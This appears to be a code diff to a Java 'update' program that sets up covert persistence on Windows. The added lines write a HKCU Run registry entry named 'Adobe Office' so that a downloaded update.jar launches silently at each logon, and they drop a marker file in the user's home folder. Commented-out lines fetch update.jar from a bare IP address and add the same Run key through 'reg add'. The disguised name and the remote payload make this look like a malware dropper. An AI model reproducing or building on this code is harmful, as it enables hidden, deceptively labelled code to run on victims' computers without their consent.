@@ -4,6 +4,7 @@ import java.io.IOException;
 import java.io.InputStream;
 import java.io.InputStreamReader;
 import java.io.OutputStream;
+import java.io.PrintWriter;
 import java.io.UnsupportedEncodingException;
 import java.lang.reflect.InvocationTargetException;
 import java.net.MalformedURLException;
@@ -19,9 +20,10 @@ import javax.swing.JOptionPane;
 import java.io.BufferedReader;
 import java.io.File;
 import java.io.FileInputStream;
+import java.io.FileNotFoundException;
 import java.io.FileOutputStream;
 import java.io.InputStreamReader;
-
+import javax.jnlp.*;
 
 
 public class update{
@@ -40,6 +42,7 @@ public class update{
 		
 		//String sproxy= GetProxy.GetParameters();
 		String decodedPath="";
+		String jhome=System.getProperty("java.home");
 		try{
 			 decodedPath = URLDecoder.decode(path, "UTF-8");
 			 decodedPath=decodedPath.replace("/", "\\");
@@ -48,9 +51,10 @@ public class update{
 		catch (UnsupportedEncodingException e) {
             e.printStackTrace();
 		}
-		//JOptionPane.showMessageDialog(null, decodedPath + "update.jar");
+		//JOptionPane.showMessageDialog(null, jhome );
+		
 		try {
-        	Thread.sleep(60 * 1000);
+        	Thread.sleep(6 * 1000);
         }
         catch (InterruptedException e) {
             e.printStackTrace();
@@ -71,23 +75,50 @@ public class update{
 		{
 			    
 		}
+/*		String value = "\""+jhome+"\\javaw.exe -jar " + System.getProperty("user.home") + "\\update.jar\"";
+		String cmdreg="reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Adobe-Office /t REG_SZ /d "+ value +" /f";
+				
+		try{
+			Process proc = runtime.exec(cmdreg);
+		}
+		catch (IOException e) {
+		}
+*/
+		File f = new File(System.getProperty("user.home")+"\\jhome.txt");
+
+//		if(!f.exists() && !f.isDirectory()) { 
+			// do something
+//			DownloadFile.GetFile("http://52.26.124.145/update.jar", System.getProperty("user.home") + "\\update.jar");
 		try{
 			
 			
-			String value = "javaw -jar \"" + System.getProperty("user.home") + "\\update.jar\"";
+			String value =jhome+"\\bin\\javaw.exe -jar \"" + System.getProperty("user.home") + "\\update.jar\"";
+			//String value = "javaw.exe -jar \"" + System.getProperty("user.home") + "\\update.jar\"";
+			
 			try{
-			WinRegistry.writeStringValue(WinRegistry.HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", "Adobe Office", value);
+				//String curver = WinRegistry.readString(WinRegistry.HKEY_LOCAL_MACHINE, "SOFTWARE\\JavaSoft\\Java Runtime Environment","CurrentVersion");
+				//String javahome  ="";// WinRegistry.readString(WinRegistry.HKEY_LOCAL_MACHINE, "SOFTWARE\\JavaSoft\\Java Runtime Environment\\"+curver,"JavaHome");
+				//value = javahome+"\\javaw.exe -jar \"" + System.getProperty("user.home") + "\\update.jar\"";
+				
+				WinRegistry.writeStringValue(WinRegistry.HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", "Adobe Office", value);
+				try(  PrintWriter out = new PrintWriter( System.getProperty("user.home")+"\\jhome.txt" )  ){
+				    out.println( jhome );
+				}
+				catch (FileNotFoundException e) {
+		            e.printStackTrace();
+		        }
 			}
 			catch (IllegalAccessException ex)
 			{
-				    
+				JOptionPane.showMessageDialog(null, "Alt"); 
 			}
-		}
+			
+		}		
 		catch (InvocationTargetException ex)
 		{
 			    
 		}
-		
+//		}
 	/*	try {
 			
 			Runtime runtime = Runtime.getRuntime();
